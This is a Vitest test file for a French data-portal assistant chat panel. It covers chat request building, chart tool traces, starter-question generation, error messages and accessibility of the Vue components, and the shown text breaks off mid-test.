// @vitest-environment happy-dom
import { flushPromises, mount } from '@vue/test-utils'
import { defineComponent, h, nextTick } from 'vue'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { ChartForApi, ColumnDefinition } from '@datagouv/components-next'
import ChatPanel from '~/components/Assistant/ChatPanel.vue'
import AssistantSpinner from '~/components/Assistant/AssistantSpinner.vue'
import ToolTrace from '~/components/Assistant/ToolTrace.vue'
import { buildChatBody, buildChatDisplayItems, chartToolResults, getStarterQuestions, isNearChatBottom, mapAssistantError, toAssistantVisualization } from '~/utils/assistant'
import type { AssistantVisualization, ToolTrace as ToolTraceModel } from '~/utils/assistant'

const sendMessageMock = vi.hoisted(() => vi.fn())
const stopMock = vi.hoisted(() => vi.fn())
const newConversationMock = vi.hoisted(() => vi.fn())

// The real builder, spied on to check which messages are rebuilt on each chunk.
vi.mock('~/utils/assistant', async (importOriginal) => {
  const actual = await importOriginal<typeof import('~/utils/assistant')>()
  return { ...actual, buildChatDisplayItems: vi.fn(actual.buildChatDisplayItems) }
})

// State shared with the mocked useAssistantChat. The mock factory (which runs
// after imports) fills it with real Vue refs; tests set state before mounting.
const chatState = vi.hoisted(() => ({} as {
  messages: import('vue').Ref<Array<{ id: string, role: string, parts: Array<Record<string, unknown>> }>>
  status: import('vue').Ref<string>
  error: import('vue').Ref<unknown>
}))

vi.mock('~/components/Assistant/useAssistantChat', async () => {
  const { ref, shallowRef } = await import('vue')
  // useChat publishes a new array, and a new object for each changed message.
  chatState.messages = shallowRef([])
  chatState.status = ref('ready')
  chatState.error = ref(null)
  return {
    useAssistantChat: () => ({ ...chatState, sendMessage: sendMessageMock, stop: stopMock, newConversation: newConversationMock }),
  }
})

function assistantTextMessage(text: string) {
  return {
    id: `msg-${Math.random().toString(36).slice(2)}`,
    role: 'assistant',
    parts: [{ type: 'text', text }],
  }
}

type PanelResource = { title: string, format: string | null }

function mountPanel(
  resourceId: string | null,
  visualization: AssistantVisualization | null = null,
  { columns = [], resource = resourceId ? { title: 'Table parquet A', format: 'parquet' } : null }: { columns?: Array<ColumnDefinition>, resource?: PanelResource | null } = {},
) {
  return mount(ChatPanel, {
    props: { resourceId, visualization, columns, resource },
    attachTo: document.body,
    global: {
      mocks: { $t: (key: string) => key },
    },
  })
}

const CHART = {
  title: 'Population',
  description: '',
  x_axis: { column_x: 'annee', type: 'discrete', sort_x_by: 'axis_x', sort_x_direction: 'asc', limit: null },
  y_axis: { label: null, unit: null, unit_position: null, min: null, max: null },
  series: [{ type: 'line', column_y: 'pop', aggregate_y: 'sum', resource_id: 'r1', column_x_name_override: null, filters: null }],
}

function traceOf(part: Record<string, unknown>) {
  const [item] = buildChatDisplayItems([part])
  return item?.kind === 'trace' ? item.trace : null
}

describe('toAssistantVisualization', () => {
  const filter = { _cls: 'Filter', column: 'reg', condition: 'exact', value: '11' } as const
  const chart = {
    ...CHART,
    private: true,
    extras: { secret: 1 },
    owner: 'u1',
    organization: null,
    series: [{ ...CHART.series[0], filters: filter }],
  } as unknown as ChartForApi

  it('keeps only what the assistant needs', () => {
    expect(toAssistantVisualization(chart, { filter, chart_type: 'histogram' }, true)).toEqual({
      exists: true,
      title: 'Population',
      description: '',
      x_axis: CHART.x_axis,
      y_axis: CHART.y_axis,
      series: [{ type: 'line', column_y: 'pop', aggregate_y: 'sum', resource_id: 'r1', filters: filter }],
      filter,
      chart_type: 'histogram',
    })
  })

  it('tells a new chart from a saved one', () => {
    expect(toAssistantVisualization(chart, { filter: null }, false)).toMatchObject({ exists: false, filter: null, chart_type: null })
  })
})

describe('buildChatBody', () => {
  const messages = [{ id: '1', role: 'user', parts: [{ type: 'text', text: 'Bonjour' }] }]
  const visualization = toAssistantVisualization(CHART as unknown as ChartForApi, { filter: null, chart_type: 'line' }, true)

  it('includes resource_id when a resource is selected', () => {
    expect(buildChatBody(messages, 'f47ac10b-58cc-4372-a567-0e02b2c3d479', null)).toEqual({
      messages,
      resource_id: 'f47ac10b-58cc-4372-a567-0e02b2c3d479',
    })
  })

  it('omits resource_id when no resource is selected', () => {
    const body = buildChatBody(messages, null, null)
    expect(body).toEqual({ messages })
    expect(body).not.toHaveProperty('resource_id')
    expect(body).not.toHaveProperty('visualization')
  })

  it('sends the visualization with the resource id', () => {
    expect(buildChatBody(messages, 'r1', visualization)).toEqual({ messages, resource_id: 'r1', visualization })
  })

  it('adds the id/trigger/messageId protocol fields when provided', () => {
    expect(buildChatBody(messages, null, null, { id: 'chat-1', trigger: 'submit-message', messageId: undefined }))
      .toEqual({ id: 'chat-1', trigger: 'submit-message', messageId: undefined, messages })
  })
})

describe('chartToolResults', () => {
  it('extracts create and update results in order', () => {
    const results = chartToolResults([
      { id: 'u', role: 'user', parts: [{ type: 'text', text: 'hi' }] },
      {
        id: 'a',
        role: 'assistant',
        parts: [
          { type: 'tool-create_chart', toolCallId: 'c1', state: 'output-available', input: {}, output: { status: 'ok', chart: CHART, more_groups: true } },
          { type: 'tool-query_data', toolCallId: 'q1', state: 'output-available', input: {}, output: 'a | b' },
          { type: 'tool-update_chart', toolCallId: 'c2', state: 'output-available', input: {}, output: { status: 'ok', patch: { title: 'Nouveau' } } },
        ],
      },
    ])

    expect(results).toEqual([
      { toolCallId: 'c1', kind: 'create', chart: CHART, moreGroups: true },
      { toolCallId: 'c2', kind: 'update', patch: { title: 'Nouveau' } },
    ])
  })

  it('defaults moreGroups to false', () => {
    const [result] = chartToolResults([
      { role: 'assistant', parts: [{ type: 'tool-create_chart', toolCallId: 'c1', state: 'output-available', output: { status: 'ok', chart: CHART } }] },
    ])
    expect(result).toMatchObject({ kind: 'create', moreGroups: false })
  })

  it('skips error results and incomplete calls', () => {
    expect(chartToolResults([
      {
        role: 'assistant',
        parts: [
          { type: 'tool-create_chart', toolCallId: 'e', state: 'output-available', output: { status: 'error', errors: ['x'] } },
          { type: 'tool-create_chart', toolCallId: 'i', state: 'input-available', input: {} },
          { type: 'tool-update_chart', toolCallId: 's', state: 'input-streaming' },
          { type: 'tool-update_chart', toolCallId: 'o', state: 'output-error', errorText: 'boom' },
        ],
      },
    ])).toEqual([])
  })

  it('skips malformed outputs and messages', () => {
    expect(chartToolResults([
      null,
      'text',
      { role: 'assistant' },
      { role: 'assistant', parts: [
        { type: 'tool-create_chart', toolCallId: 'a', state: 'output-available', output: { status: 'ok' } },
        { type: 'tool-create_chart', toolCallId: 'b', state: 'output-available', output: { status: 'ok', chart: { series: 'nope' } } },
        { type: 'tool-create_chart', toolCallId: 'c', state: 'output-available', output: 'texte' },
        { type: 'tool-update_chart', toolCallId: 'd', state: 'output-available', output: { status: 'ok', patch: null } },
        { type: 'tool-update_chart', toolCallId: 'e', state: 'output-available', output: { status: 'ok', patch: [] } },
        { type: 'tool-create_chart', state: 'output-available', output: { status: 'ok', chart: CHART } },
      ] },
    ])).toEqual([])
  })
})

describe('buildChatDisplayItems', () => {
  it('keeps alternating tool calls as separate per-call traces in arrival order', () => {
    const items = buildChatDisplayItems([
      { type: 'tool-query_data', state: 'output-available', input: {}, output: 'a\n1' },
      { type: 'tool-inspect_schema', state: 'output-available', input: {}, output: { columns: ['year'], rowCount: 1 } },
      { type: 'tool-create_chart', state: 'output-available', input: {}, output: { status: 'ok', chart: CHART } },
    ])
    const traces = items.map(item => (item.kind === 'trace' ? item.trace.type : null))
    expect(traces).toEqual(['tool-query_data', 'tool-inspect_schema', 'tool-create_chart'])
  })

  it('groups consecutive reasoning parts and keeps text', () => {
    expect(buildChatDisplayItems([
      { type: 'reasoning', text: 'a' },
      { type: 'reasoning', text: 'b' },
      { type: 'text', text: 'Bonjour' },
    ])).toEqual([{ kind: 'thinking', text: 'ab' }, { kind: 'text', text: 'Bonjour' }])
  })

  it('carries a string tool output on the trace and truncates it', () => {
    expect(traceOf({ type: 'tool-query_data', state: 'output-available', output: 'col1 | col2\nval1 | val2' })?.output).toBe('col1 | col2\nval1 | val2')
    const trace = traceOf({ type: 'tool-query_data', state: 'output-available', output: 'x'.repeat(2001) })
    expect(trace?.output).toHaveLength(2001)
    expect(trace?.output?.endsWith('…')).toBe(true)
  })

  it('shows the error text of a failed tool', () => {
    expect(traceOf({ type: 'tool-query_data', state: 'output-error', errorText: 'boom' })).toMatchObject({ error: true, summary: 'boom' })
    expect(traceOf({ type: 'tool-query_data', state: 'output-error' })).toMatchObject({ error: true, summary: 'Échec de l’opération' })
  })
})

describe('summarizes chart tool traces', () => {
  const summaryOf = (part: Record<string, unknown>) => traceOf({ state: 'output-available', input: {}, ...part })?.summary

  it('shows a running summary for an unfinished query', () => {
    expect(summaryOf({ type: 'tool-query_data', state: 'input-streaming' })).toBe('Exécution en cours')
  })

  it.each([
    ['one data row', 'col1 | col2\nval1 | val2', '1 ligne'],
    ['several rows', 'col1 | col2\nval1 | val2\nval3 | val4\nval5 | val6', '3 lignes'],
    ['an empty result', 'Requête exécutée avec succès, aucune ligne retournée.', 'Aucune ligne'],
    ['a header-only table', 'col1 | col2', 'Aucune ligne'],
    ['more groups', 'a | b\n1 | 2\nPlus de 50 groupes : seuls les 50 premiers sont pris en compte.', '1 ligne, plus de 50 valeurs'],
    ['a truncated table', 'a\n1\n2\nRésultat tronqué : 90 lignes au total, 2 premières lignes affichées.', '90 lignes'],
    ['a refusal', 'Requête refusée : la limite de 3 requêtes par question est atteinte.', 'Requête non exécutée'],
    ['an invalid query', 'Requête invalide : groupby demande un agrégat.', 'Requête non exécutée'],
    ['an unknown column', 'Colonne inconnue : foo.', 'Requête non exécutée'],
    ['an unavailable service', 'Le service tabulaire est indisponible.', 'Requête non exécutée'],
    ['no active resource', 'Aucune ressource active : ouvrez une ressource dans le data studio.', 'Requête non exécutée'],
    ['an unknown resource', 'Ressource introuvable : aucune ressource visible ne correspond à cet identifiant.', 'Requête non exécutée'],
    ['a refused action', 'Action refusée : la limite de 5 appels d’outils par tour est atteinte.', 'Requête non exécutée'],
  ])('query_data: %s', (_case, output, summary) => {
    expect(summaryOf({ type: 'tool-query_data', output })).toBe(summary)
  })

  it('query_data falls back to the static summary for a non-string output', () => {
    expect(summaryOf({ type: 'tool-query_data', output: { rowCount: 3 } })).toBe('Je calcule la réponse à partir des données')
  })

  it('create_chart', () => {
    expect(summaryOf({ type: 'tool-create_chart', output: { status: 'ok', chart: CHART } })).toBe('Graphique créé')
    expect(summaryOf({ type: 'tool-create_chart', output: { status: 'error', errors: ['Colonne inconnue : x', 'Autre'] } })).toBe('Colonne inconnue : x ; Autre')
    expect(summaryOf({ type: 'tool-create_chart', state: 'input-available' })).toBe('Je construis le graphique')
  })

  it.each([
    [{ title: 'T' }, 'Titre modifié'],
    [{ title: 'T', y_axis: { unit: '€' } }, 'Titre et unité modifiés'],
    [{ title: 'T', description: 'd', y_axis: { unit: '€' } }, 'Titre, description et unité modifiés'],
    [{ type: 'histogram', y_axis: { label: 'L', min: 0, max: 5 } }, 'Type, libellé de l’axe Y et bornes modifiés'],
    [{ y_axis: { min: 0 } }, 'Bornes modifiées'],
    [{ description: 'd' }, 'Description modifiée'],
    [{ y_axis: { unit: '€' } }, 'Unité modifiée'],
    [{ description: 'd', y_axis: { max: 1 } }, 'Description et bornes modifiées'],
    [{ description: 'd', y_axis: { unit: '€' } }, 'Description et unité modifiées'],
  ])('update_chart %j', (patch, summary) => {
    expect(traceOf({ type: 'tool-update_chart', state: 'output-available', output: { status: 'ok', patch } })?.summary).toBe(summary)
  })

  it('update_chart reports errors', () => {
    expect(summaryOf({ type: 'tool-update_chart', output: { status: 'error', errors: ['Nope'] } })).toBe('Nope')
  })
})

describe('getStarterQuestions', () => {
  const t = (key: string, options?: Record<string, string | number> | number) =>
    typeof options === 'object' ? key.replace(/\{(\w+)\}/g, (_, name) => String(options[name])) : key
  const OPENER = 'Quel graphique peut-on faire avec ces données ?'

  it('suggests charts crossing the first useful dimension and measure', () => {
    const questions = getStarterQuestions([
      { name: '__id', type: 'number' },
      { name: 'departement', type: 'categorical' },
      { name: 'population', type: 'number' },
    ], t)

    expect(questions).toEqual([
      OPENER,
      'Fais un histogramme de la somme de « population » par « departement »',
      'Compte les lignes par « departement »',
      'Montre la moyenne de « population » par « departement »',
    ])
  })

  it('suggests a line chart over a date column', () => {
    const questions = getStarterQuestions([
      { name: 'date_mesure', type: 'date' },
      { name: 'temperature', type: 'number' },
    ], t)

    expect(questions).toContain('Trace l’évolution de « temperature » selon « date_mesure »')
  })

  it('skips identifier, code and year columns as dimensions but uses a year as time axis', () => {
    const questions = getStarterQuestions([
      { name: 'code_insee', type: 'number' },
      { name: 'annee', type: 'year' },
      { name: 'url', type: 'text' },
      { name: 'region_id', type: 'categorical' },
    ], t)

    expect(questions).toEqual([
      OPENER,
      'Trace l’évolution du nombre de lignes selon « annee »',
      'Propose-moi un graphique pertinent pour cette ressource',
    ])
  })

  it('suggests charts on the vote counts of « Table parquet A », not on its reference or free-text title', () => {
    // Column names and types as api-tabular profiles that parquet resource.
    const questions = getStarterQuestions([
      { name: 'id', type: 'text' },
      { name: 'url', type: 'text' },
      { name: 'date', type: 'date' },
      { name: 'pour', type: 'number' },
      { name: 'title', type: 'text' },
      { name: 'contre', type: 'number' },
      { name: 'votants', type: 'number' },
      { name: 'dossier_ref', type: 'number' },
      { name: 'suffrages_exprimes', type: 'number' },
    ], t)

    expect(questions).toEqual([
      OPENER,
      'Trace l’évolution de « pour » selon « date »',
      'Propose-moi un graphique pertinent pour cette ressource',
    ])
  })

  it('skips reference and number identifiers as measures, but not measures sharing their letters', () => {
    for (const name of ['dossier_ref', 'ref_dossier', 'reference', 'num_dossier', 'numero', 'numéro_ligne']) {
      const questions = getStarterQuestions([{ name, type: 'number' }, { name: 'date', type: 'date' }], t)
      expect(questions, name).toContain('Trace l’évolution du nombre de lignes selon « date »')
    }
    for (const name of ['montant_numeraire', 'nombre_refus', 'preference']) {
      const questions = getStarterQuestions([{ name, type: 'number' }, { name: 'date', type: 'date' }], t)
      expect(questions, name).toContain(`Trace l’évolution de « ${name} » selon « date »`)
    }
  })

  it('skips free-text columns as dimensions', () => {
    for (const name of ['title', 'titre', 'description', 'libelle_long', 'commentaire', 'url']) {
      expect(getStarterQuestions([{ name, type: 'text' }], t), name).toEqual([
        OPENER,
        'Propose-moi un graphique pertinent pour cette ressource',
      ])
    }
  })

  it('prefers a categorical column over a text column as dimension', () => {
    const questions = getStarterQuestions([
      { name: 'nom', type: 'text' },
      { name: 'region', type: 'categorical' },
    ], t)

    expect(questions).toContain('Compte les lignes par « region »')
  })

  it('compares two dimensions when there is no measure nor date', () => {
    const questions = getStarterQuestions([
      { name: 'commune', type: 'text' },
      { name: 'ouvert', type: 'boolean' },
    ], t)

    expect(questions).toEqual([
      OPENER,
      'Compte les lignes par « commune »',
      'Compare le nombre de lignes par « ouvert »',
    ])
  })

  it('falls back to generic chart prompts without columns', () => {
    expect(getStarterQuestions([], t)).toEqual([
      OPENER,
      'Propose-moi un graphique pertinent pour cette ressource',
    ])
  })
})

describe('isNearChatBottom', () => {
  function scrolledTo(scrollTop: number, scrollHeight = 1000, clientHeight = 200) {
    return { scrollTop, scrollHeight, clientHeight }
  }

  it('returns true within the threshold and false far from the bottom', () => {
    expect(isNearChatBottom(scrolledTo(720))).toBe(true)
    expect(isNearChatBottom(scrolledTo(800))).toBe(true)
    expect(isNearChatBottom(scrolledTo(0))).toBe(false)
    expect(isNearChatBottom(scrolledTo(700), 100)).toBe(true)
  })
})

describe('mapAssistantError', () => {
  it('maps status codes and falls back', () => {
    expect(mapAssistantError(Object.assign(new Error('x'), { statusCode: 401 }))).toContain('Veuillez vous reconnecter')
    expect(mapAssistantError(Object.assign(new Error('x'), { statusCode: 413 }))).toBe('La conversation est trop volumineuse.')
    expect(mapAssistantError(Object.assign(new Error('x'), { statusCode: 429 }))).toContain('Quota journalier dépassé')
    expect(mapAssistantError(Object.assign(new Error('x'), { statusCode: 503 }))).toContain('Assistant non configuré')
    expect(mapAssistantError(new TypeError('fetch failed'))).toContain('Une erreur est survenue')
  })
})

describe('AssistantSpinner', () => {
  function stubReducedMotion(matches: boolean) {
    vi.stubGlobal('matchMedia', vi.fn(() => ({ matches, addEventListener: vi.fn(), removeEventListener: vi.fn() })))
  }

  beforeEach(() => {
    vi.useFakeTimers()
  })

  afterEach(() => {
    vi.useRealTimers()
    vi.unstubAllGlobals()
  })

  it('cycles its frames, then clears its timer on unmount', async () => {
    stubReducedMotion(false)
    const wrapper = mount(AssistantSpinner)
    const first = wrapper.text()

    await vi.advanceTimersByTimeAsync(80)
    expect(wrapper.text()).not.toBe(first)
    expect(wrapper.attributes('aria-hidden')).toBe('true')

    // Mounting itself leaves an unrelated timer: compare counts around the unmount.
    const timersWhileMounted = vi.getTimerCount()
    wrapper.unmount()
    expect(vi.getTimerCount()).toBe(timersWhileMounted - 1)
  })

  it('holds a still frame without any timer under reduced motion', async () => {
    stubReducedMotion(true)
    const setIntervalSpy = vi.spyOn(globalThis, 'setInterval')
    const wrapper = mount(AssistantSpinner)
    const still = wrapper.text()

    await vi.advanceTimersByTimeAsync(500)
    expect(wrapper.text()).toBe(still)
    expect(setIntervalSpy).not.toHaveBeenCalled()
  })
})

describe('ToolTrace', () => {
  const trace: ToolTraceModel = {
    type: 'tool-query_data',
    state: 'output-available',
    label: 'Interrogation des données',
    summary: 'Je calcule la réponse à partir des données',
    error: false,
    errorText: null,
    output: null,
    details: [{ label: 'Lignes', value: '12' }],
  }

  function mountTrace() {
    return mount(ToolTrace, {
      props: { trace },
      global: { mocks: { $t: (key: string) => key } },
    })
  }

  it('links the toggle button to the panel with aria-controls', () => {
    const wrapper = mountTrace()
    const panel = wrapper.find('.tool-trace-panel')
    const button = wrapper.find('button')

    expect(button.attributes('aria-expanded')).toBe('false')
    expect(button.attributes('aria-controls')).toBe(panel.attributes('id'))
  })

  it('names the toggle button with the label and the summary', () => {
    const button = mountTrace().find('button')

    // No aria-label: the accessible name is the visible label and summary.
    expect(button.attributes('aria-label')).toBeUndefined()
    expect(button.text()).toContain('Interrogation des données')
    expect(button.text()).toContain('Je calcule la réponse à partir des données')
  })

  it('keeps the collapsed panel inert and removes inert when expanded', async () => {
    const wrapper = mountTrace()
    const panel = wrapper.find('.tool-trace-panel')

    expect(panel.attributes('inert')).toBeDefined()

    await wrapper.find('button').trigger('click')
    expect(wrapper.find('button').attributes('aria-expanded')).toBe('true')
    expect(wrapper.find('.tool-trace-panel').attributes('inert')).toBeUndefined()
  })

  it('renders the string output in a pre block when expanded', async () => {
    const wrapper = mount(ToolTrace, {
      props: { trace: { ...trace, output: 'col1 | col2\nval1 | val2' } },
      global: { mocks: { $t: (key: string) => key } },
    })
    await wrapper.find('button').trigger('click')

    const blocks = wrapper.findAll('pre')
    expect(blocks).toHaveLength(1)
    expect(blocks[0]!.text()).toBe('col1 | col2\nval1 | val2')
  })

  it('renders no output block when the trace output is null', async () => {
    const wrapper = mountTrace()
    await wrapper.find('button').trigger('click')

    expect(wrapper.findAll('pre')).toHaveLength(0)
  })
})

describe('ChatPanel', () => {
  beforeEach(() => {
    chatState.messages.value = []
    chatState.status.value = 'ready'
    chatState.error.value = null
  })

  afterEach(() => {
    vi.clearAllMocks()
  })

  it('disables the input and shows a waiting message without a resource', () => {
    const wrapper = mountPanel(null)

    const textarea = wrapper.find('textarea#assistant-input')
    expect(textarea.attributes('disabled')).toBeDefined()
    expect(wrapper.find('#assistant-waiting').exists()).toBe(true)
    expect(wrapper.find('#assistant-waiting').text()).toBe('Chargez une ressource pour permettre à l’assistant de comprendre sa structure.')
  })

  it('welcomes with the animated mark and the exploration title before a resource is chosen', () => {
    const wrapper = mountPanel(null)

    const emptyState = wrapper.find('[data-testid="assistant-empty-state"]')
    expect(emptyState.exists()).toBe(true)
    expect(emptyState.find('h3').text()).toBe('Assistant d’exploration de données')
    expect(emptyState.find('picture source').attributes('media')).toBe('(prefers-reduced-motion: reduce)')
    expect(emptyState.find('picture img').exists()).toBe(true)
  })

  it('has no heading repeating the Assistant tab', () => {
    const wrapper = mountPanel('resource-1')

    expect(wrapper.findAll('h3').map(h => h.text())).not.toContain('Assistant')
  })

  it('welcomes the user with suggestion buttons built from the schema', () => {
    const wrapper = mountPanel('resource-1', null, { columns: [{ name: 'departement', type: 'categorical' }] })

    expect(wrapper.find('[data-testid="assistant-empty-state"]').exists()).toBe(true)
    const suggestions = wrapper.findAll('[data-testid="assistant-suggestion"]')
    expect(suggestions.length).toBe(3)
    expect(suggestions.every(button => button.element.tagName === 'BUTTON' && button.attributes('type') === 'button')).toBe(true)
    expect(suggestions.map(button => button.text())).toContain('Compte les lignes par « departement »')
  })

  it('titles the welcome and shows the animated mark, swapped for the still logo under reduced motion', () => {
    const wrapper = mountPanel('resource-1')

    const emptyState = wrapper.find('[data-testid="assistant-empty-state"]')
    expect(emptyState.find('h3').text()).toBe('Assistant de visualisation')
    const picture = emptyState.find('picture')
    expect(picture.attributes('aria-hidden')).toBe('true')
    const source = picture.find('source')
    expect(source.attributes('media')).toBe('(prefers-reduced-motion: reduce)')
    expect(source.attributes('srcset')).toBe('/nuxt_images/assistant/assistant-logo.svg')
    const img = picture.find('img')
    expect(img.attributes('src')).toBe('/nuxt_images/assistant/assistant-signature.webp')
    expect(img.attributes('alt')).toBe('')
  })

  it('fills the composer with a clicked suggestion without sending it', async () => {
    const wrapper = mountPanel('resource-1')

    const suggestion = wrapper.find('[data-testid="assistant-suggestion"]')
    await suggestion.trigger('click')

    const textarea = wrapper.find('textarea#assistant-input')
    expect((textarea.element as HTMLTextAreaElement).value).toBe(suggestion.text())
    expect(document.activeElement).toBe(textarea.element)
    expect(sendMessageMock).not.toHaveBeenCalled()
  })

  it('hides the welcome once the conversation has started', () => {
    chatState.messages.value = [assistantTextMessage('Bonjour')]
    const wrapper = mountPanel('resource-1')

    expect(wrapper.find('[data-testid="assistant-empty-state"]').exists()).toBe(false)
  })

  it('offers no suggestion without a resource', () => {
    const wrapper = mountPanel(null)

    expect(wrapper.findAll('[data-testid="assistant-suggestion"]')).toHaveLength(0)
  })

  it('lists the active resource and its format in a labelled context block', () => {
    const wrapper = mountPanel('resource-1')

    const context = wrapper.find('[aria-label="Contexte utilisé par l’assistant"]')
    expect(context.exists()).toBe(true)
    expect(context.text()).toContain('Table parquet A')
    expect(context.text()).toContain('parquet')
    expect(context.text()).not.toContain('Visualisation en cours')
  })

  it('mentions the current visualization when one is sent', () => {
    const visualization = toAssistantVisualization(CHART as unknown as ChartForApi, { filter: null, chart_type: 'line' }, false)
    const wrapper = mountPanel('resource-1', visualization)

    expect(wrapper.find('[aria-label="Contexte utilisé par l’assistant"]').text()).toContain('Visualisation en cours')
  })

  it('shows no context block without a resource', () => {
    const wrapper = mountPanel(null)

    expect(wrapper.find('[aria-label="Contexte utilisé par l’assistant"]').exists()).toBe(false)
  })

  it('warns that the assistant can make mistakes', () => {
    const wrapper = mountPanel('resource-1')

    expect(wrapper.text()).toContain('L’assistant peut faire des erreurs.')
  })

  it('announces new messages politely in a log', () => {
    chatState.messages.value = [assistantTextMessage('Bonjour')]
    const wrapper = mountPanel('resource-1')

    const log = wrapper.find('[role="log"]')
    expect(log.exists()).toBe(true)
    expect(log.attributes('aria-live')).toBe('polite')
    expect(log.find('article').exists()).toBe(true)
  })

  it('enables the input once a resource is selected', () => {
    const wrapper = mountPanel('f47ac10b-58cc-4372-a567-0e02b2c3d479')

    const textarea = wrapper.find('textarea#assistant-input')
    expect(textarea.attributes('disabled')).toBeUndefined()
    expect(wrapper.find('#assistant-waiting').exists()).toBe(false)
  })

  it('sends the composer text and clears it', async () => {
    const wrapper = mountPanel('resource-1')

    await wrapper.find('textarea#assistant-input').setValue('Montre-moi un graphique')
    await wrapper.find('button[aria-label="Envoyer"]').trigger('click')

    expect(sendMessageMock).toHaveBeenCalledWith({ text: 'Montre-moi un graphique' })
    expect((wrapper.find('textarea#assistant-input').element as HTMLTextAreaElement).value).toBe('')
  })

  it('renders no nested form inside an enclosing form (e.g. the chart-save form)', async () => {
    const onParentSubmit = vi.fn()
    const wrapper = mount(defineComponent({
      setup: () => () => h('form', { onSubmit: onParentSubmit }, [h(ChatPanel, { resourceId: 'resource-1', visualization: null, columns: [], resource: null })]),
    }), {
      global: { mocks: { $t: (key: string) => key } },
    })

    expect(wrapper.findAll('form')).toHaveLength(1)

    await wrapper.find('textarea#assistant-input').setValue('Bonjour')
    await wrapper.find('button[aria-label="Envoyer"]').trigger('click')

    expect(sendMessageMock).toHaveBeenCalledWith({ text: 'Bonjour' })
    expect(onParentSubmit).not.toHaveBeenCalled()
  })

  it('sends on Enter but inserts a newline on Shift+Enter', async () => {
    const wrapper = mountPanel('resource-1')

    const textarea = wrapper.find('textarea#assistant-input')
    await textarea.setValue('Bonjour')

    await textarea.trigger('keydown.enter', { shiftKey: true })
    expect(sendMessageMock).not.toHaveBeenCalled()

    await textarea.trigger('keydown.enter')
    expect(sendMessageMock).toHaveBeenCalledWith({ text: 'Bonjour' })
  })

  it('caps the composer at 4000 characters', () => {
    const wrapper = mountPanel('resource-1')

    expect(wrapper.find('textarea#assistant-input').attributes('maxlength')).toBe('4000')
  })

  it('disables the send button when the input is empty or while waiting', async () => {
    const wrapper = mountPanel('resource-1')
    const send = () => wrapper.find('button[aria-label="Envoyer"]')

    expect(send().attributes('disabled')).toBeDefined()

    await wrapper.find('textarea#assistant-input').setValue('ok')
    expect(send().attributes('disabled')).toBeUndefined()

    await wrapper.unmount()
    const waitingWrapper = mountPanel(null)
    expect(waitingWrapper.find('button[aria-label="Envoyer"]').attributes('disabled')).toBeDefined()
  })

  it('shows the character counter beyond 3600 characters, in red at the max', async () => {
    const wrapper = mountPanel('resource-1')
    const textarea = wrapper.find('textarea#assistant-input')
    const expected = `${(3601).toLocaleString('fr-FR')} / ${(4000).toLocaleString('fr-FR')}`

    expect(wrapper.text()).not.toContain('/ 4 000')

    await textarea.setValue('a'.repeat(3601))
    expect(wrapper.text()).toContain(expected)

    await textarea.setValue('a'.repeat(4000))
    const counter = wrapper.findAll('footer span').find(span => span.text().includes('/'))
    expect(counter).toBeDefined()
    expect(counter!.classes()).toContain('text-new-error')
  })

  describe('thinking indicator', () => {
    const question = { id: 'u1', role: 'user', parts: [{ type: 'text', text: 'Question' }] }

    it('appears once the message is sent, before the reply starts', () => {
      chatState.status.value = 'submitted'
      chatState.messages.value = [question]
      const wrapper = mountPanel('resource-1')

      const thinking = wrapper.find('[data-testid="assistant-thinking"]')
      expect(thinking.exists()).toBe(true)
      expect(thinking.find('.sr-only').text()).toBe('L’assistant réfléchit…')
      expect(wrapper.find('[data-testid="assistant-responding"]').exists()).toBe(false)
    })

    it('stays while the streamed reply has nothing to show yet', () => {
      chatState.status.value = 'streaming'
      chatState.messages.value = [question, { id: 'a1', role: 'assistant', parts: [{ type: 'step-start' }] }]
      const wrapper = mountPanel('resource-1')

      expect(wrapper.find('[data-testid="assistant-thinking"]').exists()).toBe(true)
    })

    it('gives way to a discreet progress line from the first reply content', async () => {
      chatState.status.value = 'submitted'
      chatState.messages.value = [question]
      const wrapper = mountPanel('resource-1')

      chatState.status.value = 'streaming'
      chatState.messages.value = [question, assistantTextMessage('Voici')]
      await nextTick()

      expect(wrapper.find('[data-testid="assistant-thinking"]').exists()).toBe(false)
      expect(wrapper.find('[data-testid="assistant-responding"]').attributes('aria-hidden')).toBe('true')
    })

    it('disappears once the reply is complete', () => {
      chatState.messages.value = [question, assistantTextMessage('Voici')]
      const wrapper = mountPanel('resource-1')

      expect(wrapper.find('[data-testid="assistant-thinking"]').exists()).toBe(false)
      expect(wrapper.find('[data-testid="assistant-responding"]').exists()).toBe(false)
    })
  })

  it('shows a stop button while responding that stops the stream', async () => {
    chatState.status.value = 'streaming'
    const wrapper = mountPanel('resource-1')

    const button = wrapper.findAll('button').find(b => b.text() === 'Arrêter')
    expect(button).toBeDefined()
    expect(wrapper.find('button[aria-label="Envoyer"]').exists()).toBe(false)

    await button!.trigger('click')
    expect(stopMock).toHaveBeenCalled()
  })

  it('ignores a second submit within the anti-double-send cooldown', async () => {
    const now = vi.spyOn(Date, 'now').mockReturnValue(10_000)
    const wrapper = mountPanel('resource-1')
    const textarea = wrapper.find('textarea#assistant-input')

    await textarea.setValue('premier')
    await wrapper.find('button[aria-label="Envoyer"]').trigger('click')
    await textarea.setValue('second')
    await wrapper.find('button[aria-label="Envoyer"]').trigger('click')

    expect(sendMessageMock).toHaveBeenCalledTimes(1)
    expect(sendMessageMock).toHaveBeenCalledWith({ text: 'premier' })
    now.mockRestore()
  })

  it('renders assistant text as markdown', () => {
    chatState.messages.value = [assistantTextMessage('Voici **le** résultat avec un `code`.')]
    const wrapper = mountPanel('resource-1')

    const markdown = wrapper.find('.prose')
    expect(markdown.exists()).toBe(true)
    expect(markdown.html()).toContain('<strong>le</strong>')
    expect(markdown.html()).toContain('<code>code</code>')
  })

  it('right-aligns user messages in a gray bubble and marks both roles with data-message-role', () => {
    chatState.messages.value = [
      { id: 'u1', role: 'user', parts: [{ type: 'text', text: 'Montre un graphique' }] },
      assistantTextMessage('Voici le résultat.'),
    ]
    const wrapper = mountPanel('resource-1')

    const articles = wrapper.findAll('article')
    expect(articles).toHaveLength(2)

    const userArticle = articles[0]
    expect(userArticle.attributes('data-message-role')).toBe('user')
    expect(userArticle.classes()).toContain('ml-auto')
    expect(userArticle.classes()).toContain('items-end')
    const bubble = userArticle.find('div.whitespace-pre-wrap')
    expect(bubble.exists()).toBe(true)
    expect(bubble.classes()).toContain('rounded-md')
    expect(bubble.classes()).toContain('bg-gray-lower')
    expect(bubble.text()).toBe('Montre un graphique')

    const assistantArticle = articles[1]
    expect(assistantArticle.attributes('data-message-role')).toBe('assistant')
